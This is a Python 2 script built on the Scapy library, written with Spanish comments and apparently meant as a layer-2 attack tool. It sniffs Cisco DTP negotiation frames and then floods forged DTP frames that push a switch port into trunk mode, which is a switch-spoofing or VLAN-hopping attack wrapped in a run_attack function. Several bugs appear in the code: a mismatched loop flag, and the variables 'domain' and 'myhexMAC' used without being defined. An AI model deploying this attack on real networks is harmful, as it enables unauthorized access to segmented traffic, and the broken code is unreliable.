# -*- coding: utf-8 -*-
import logging
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)


from scapy.all import *
from scapy.layers.l2 import *

from scapy.layers.l2 import LLC, STP, Dot3,SNAP
from scapy.all import sendp,sniff,get_if_hwaddr

# --------------------------------------------------------------------------
#
# --------------------------------------------------------------------------
def reciveValidPacket(interface):

    validPacket=False


    while not validPacket:

        pkt = sniff(stop_filter=lambda x: x.haslayer(SNAP), iface=interface)

        pk_list={x:y for x,y in pkt.sessions().iteritems() if "Other" in x}
        item=pk_list.popitem()
        pkts = item[1]


        for x in pkts:
            if SNAP in x:
                pSNAP = x
                break

        print pSNAP
        l_SNAP = pSNAP.getlayer(SNAP, nb=1)
        code = l_SNAP.code
        if code == 0x2004:
            ValidPacket = True

    print pkt
    return pkt




def run_attack(config):

    

    pkt=reciveValidPacket(config.interface[0])

    sendPackets(config.interface[0], pkt)


def sendPackets(interface,pkt):

    l_SNAP=pkt.getlayer(SNAP,nb=1)
    hexload= l_SNAP.load
    sload=str(hexload.encode('hex'))

    status=sload[36]+sload[37]
    hexstatus=status.decode('hex')

    for x in range (10,27):
        if(x % 2):
            str=sload[x]+sload[x+1]
            domain=domain+str.decode('hex')


    #status -> dynamic auto
    if hexstatus =='\x04':
        #datos del paquete
        newStatus='\x81' #trunk status
        myMAC=get_if_hwaddr(interface)
        hexMAC=myMAC.replace(':','\\x')
        newLoad='\x01\x00\x01\x00\r'+domain+'\x00\x02\x00\x05'+newStatus+'\x00\x03\x00\x05\xa5\x00\x04\x00\x0a'+myhexMAC
        #creacion del paquete
        p_dot3 = Dot3(dst='01:00:0c:cc:cc:cc', src=get_if_hwaddr(interface))
        p_llc=LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        p_snap=SNAP(OUI=0x00000c, code=0x2004)
        p_raw =Raw(newLoad)
        pkt = p_dot3/p_llc/p_snap/p_raw
        sendp(pkt,loop=1,interval=30)

    #status -> desirable

    elif hexstatus == '\x03':

        newStatus=hexstatus
        newLoad='\x01\x00\x01\x00\r'+domain+'\x00\x02\x00\x05'+newStatus+'\x00\x03\x00\x05\xa5\x00\x04\x00\x0a'+myhexMAC
        #creacion del paquete
        p_dot3 = Dot3(dst='01:00:0c:cc:cc:cc', src=get_if_hwaddr(interface))
        p_llc=LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        p_snap=SNAP(OUI=0x00000c, code=0x2004)
        p_raw =Raw(newLoad)
        pkt = p_dot3/p_llc/p_snap/p_raw
        sendp(pkt,count=3,interval=30)

        newStatus='\x81'
        newLoad='\x01\x00\x01\x00\r'+domain+'\x00\x02\x00\x05'+newStatus+'\x00\x03\x00\x05\xa5\x00\x04\x00\x0a'+myhexMAC
        #creacion del paquete
        p_dot3 = Dot3(dst='01:00:0c:cc:cc:cc', src=get_if_hwaddr(interface))
        p_llc=LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        p_snap=SNAP(OUI=0x00000c, code=0x2004)
        p_raw =Raw(newLoad)
        pkt = p_dot3/p_llc/p_snap/p_raw
        sendp(pkt,loop=1,interval=30)


    #status -> trunk
    elif hexstatus == '\x81':
        newStatus='\x81'
        newLoad='\x01\x00\x01\x00\r'+domain+'\x00\x02\x00\x05'+newStatus+'\x00\x03\x00\x05\xa5\x00\x04\x00\x0a'+myhexMAC
        #creacion del paquete
        p_dot3 = Dot3(dst='01:00:0c:cc:cc:cc', src=get_if_hwaddr(interface))
        p_llc=LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        p_snap=SNAP(OUI=0x00000c, code=0x2004)
        p_raw =Raw(newLoad)
        pkt = p_dot3/p_llc/p_snap/p_raw
        sendp(pkt,loop=1,interval=30)

    #status -> access
    elif hexstatus == '\x02':
        print 'switchport mode access, no se puede hacer nada'
        exit()






